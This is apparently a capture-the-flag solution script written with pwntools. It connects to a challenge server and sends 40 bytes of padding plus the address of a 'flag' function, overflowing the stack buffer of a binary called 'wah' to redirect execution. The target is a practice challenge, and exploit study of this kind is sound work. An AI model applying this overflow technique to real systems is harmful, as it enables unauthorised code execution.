from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

elf = ELF('./wah')
# p = elf.process()
p = remote('challs.actf.co', 31224)

payload = b'a'*40
payload += p64(elf.sym.flag)

p.recv()
p.sendline(payload)

p.interactive()